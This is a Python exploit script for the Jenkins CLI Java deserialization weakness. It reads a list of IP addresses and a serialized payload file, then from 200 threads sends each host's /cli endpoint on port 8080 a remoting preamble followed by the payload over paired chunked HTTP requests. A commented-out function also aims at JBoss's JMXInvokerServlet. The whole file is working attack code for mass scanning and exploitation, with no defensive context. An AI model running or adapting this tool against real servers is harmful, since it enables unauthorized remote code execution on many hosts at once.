import requests
import sys
import queue
import threading
import time
import uuid

class test():
	def __init__(self,session):
		self.session=session
	# def post(self,ip):
	# 	with open(self.file,mode='rb') as f:
	# 		file=f.read()
	# 	target='http://'+ip+':8080'+'/invoker/JMXInvokerServlet'
	# 	print(target)
	# 	r=requests.post(target,data=file)
	# 	print(r.content)
	# PREAMLE = b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
	# PROTO = b'\x00\x00\x00\x00'

	def download(self,target):
		# target='http://'+ip.rstrip('/')+':8080'+'/cli'
		# with open(self.file,mode='rb') as f:
		# 	file=f.read()
		print(target)
		headers = {'Side' : 'download'}
		headers['Content-type'] = 'application/x-www-form-urlencoded'
		headers['Session'] = self.session
		headers['Transfer-Encoding'] = 'chunked'
		r=requests.post(target,data=' ',headers=headers,stream=True, verify=False)
		print(r.content)

	# def null_payload(self):
	# 	yield b" "
	def upload(self,target,data):
		# target='http://'+ip.rstrip('/')+':8080'+'/cli'
		# with open(self.file,mode='rb') as f:
		# 	file=f.read()
		headers = {'Side' : 'upload'}
		headers['Session'] = self.session
		headers['Content-type'] = 'application/octet-stream'
		headers['Accept-Encoding'] = None
		headers['Transfer-Encoding'] = 'chunked'
		headers['Cache-Control'] = 'no-cache'
		r=requests.post(target,data=data,headers=headers,stream=True, verify=False)

	def create_payload_chunked(self):
		yield PREAMLE
		yield PROTO
		yield file



	def worker(self,q):
		while not q.empty():
			target='http://'+q.get().rstrip('/')+':8080'+'/cli'
			try:
				print('download'+' '+target)
				t = threading.Thread(target=self.download, args=(target,))
				t.start()
				time.sleep(2)
				print('upload'+' '+target)
				self.upload(target,self.create_payload_chunked())
			finally:
				q.task_done()


if __name__ == '__main__':
	print("Example: python xx.py ip.txt 1.ser")
	# if len(sys.argv)!=3:
	# 	print("format wrong")
	# 	sys.exit()


	q=queue.Queue()
	PREAMLE = b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
	PROTO = b'\x00\x00\x00\x00'
	session = str(uuid.uuid4())
	a=test(session)
	with open(sys.argv[2],mode='rb') as f:
		file=f.read()
	ip=sys.argv[1]
	with open(ip,mode='rb') as ipf:
		for line in ipf.readlines():
			# print(line.decode('utf-8')[:-2])
			q.put(line.decode('utf-8')[:-2])
			# iplist.append(line.decode('utf-8'))
	threads=[threading.Thread(target=a.worker,args=(q,)) for i in range(200)]
	list(map(lambda x:x.start(),threads))
	q.join()
	print("scan over")
	# while not q.empty():
	# 		print(q.get())

		# print(str(ipf.readline()))
		# while q.put(ipf.readline())!=None:
		# 	print (q.get())

	# a=test(ip,file)
	# a.post()